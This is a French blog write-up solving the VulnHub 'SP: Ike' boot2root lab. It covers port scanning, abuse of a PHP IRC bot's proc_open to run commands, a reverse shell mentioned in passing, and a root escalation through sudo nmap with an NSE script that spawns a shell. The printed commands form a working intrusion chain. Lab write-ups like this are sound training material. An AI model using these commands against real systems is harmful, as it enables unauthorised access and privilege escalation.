# Solution du CTF SP: Ike de VulnHub

[SP: ike](https://www.vulnhub.com/entry/sp-ike-v101,275/) est un CTF de type boot2root proposé sur VulnHub. La description est la suivante :

> Ike is a servant of something which also starts with "I" and has only three letters.

Hmm moi j'imagine plutôt IKE donc VPN mais on voit tout de suite que c'est plutôt IRC :

```
Nmap scan report for 192.168.56.76
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
6667/tcp open  irc     InspIRCd
| irc-info: 
|   server: irc.ike.local
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 2
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.56.1
|_  error: Closing link: (nmap@192.168.56.1) [Client exited]
```

On a un serveur *InspIRCd*. Aucun exploit n'est présent pour ce logiciel sur exploit-db comme quoi soit il est bien conçu soit il n'intéresse personne :D

Sur ma machine il ne me reste que Pidgin comme client supportant IRC alors on fera avec. Je créé le compte en spécifiant l'adresse IP du serveur puis je vais sur *Comptes > devloop@192.168.56.76 > voir le message du jour* qui m'affiche les infos suivantes :

```
- #############################################
- #               ####  #  #  ####            #     
- #               #  #  #  #  #  #            # 
- #               ###   ####  ###             #
- #               #     #  #  #               #
- #               #     #  #  #               #
- #############################################
- 
- Welcome to the PHP community IRC server where you can get help with your PHP code. 
- Also feel free to talk and share information about PHP in general. 
- Join the main channel at #php for a friendly chat!
- 
- Rules:
- * Don't ask to ask, just ask.
- * Don't paste code directly in the chat, use pastebin.
- * Don't ask the same question again if no one answers.
- * Don't flood the channel in general.
- * Run PHP commands through the PHP bot with !php <command>
- * Please don't try to abuse the bot.
- * Behave like an adult.
- 
- #############################################
- #############################################

```

Avec un client plus traditionnel j'aurais eu le message directement.

Il y a donc un bot sur le chan `#php`. On va causer un peu avec lui :

![VulnHub SP Ike PHP IRC bot](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/sp_ike/irc_phpbot.png)

`proc_open` est donc notre porte d'entrée. Je peux récupérer l'environnement qui en dit suffisemment long sur le compte qui fait tourner le bot :

```php
 !php proc_open("env",array(),$something);
```

```bash
HOME=/home/ike
LOGNAME=ike
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/home/ike
```

Je rappatrie un reverse-sshx64 dans le dossier courant puis l'exécute pour avoir mon shell et tunnel SSH.

```shellsession
ike@ike:/home/ike$ cat flag.txt 
cdca0db3c1d9a7290
ike@ike:/home/ike$ sudo -l
Matching Defaults entries for ike on ike:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ike may run the following commands on ike:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/nmap
```

Un coup d'oeil à GTFObins plus tard :

```shellsession
ike@ike:/home/ike$ echo 'os.execute("/bin/dash")' > myscript 
ike@ike:/home/ike$ sudo /usr/bin/nmap --script=myscript

Starting Nmap 7.60 ( https://nmap.org ) at 2022-12-20 15:08 CET
NSE: Warning: Loading 'myscript' -- the recommended file extension is '.nse'.
# uid=0(root) gid=0(root) groups=0(root)
# # flag.txt
# d8f8254074369b6
```

Dans l'output çi-dessus on ne voit pas les commandes que je tape car je suppose que stdin n'est pas répété mais il s'agit des commandes `id`, `ls` et `cat`.

*Publié le 20 décembre 2022*
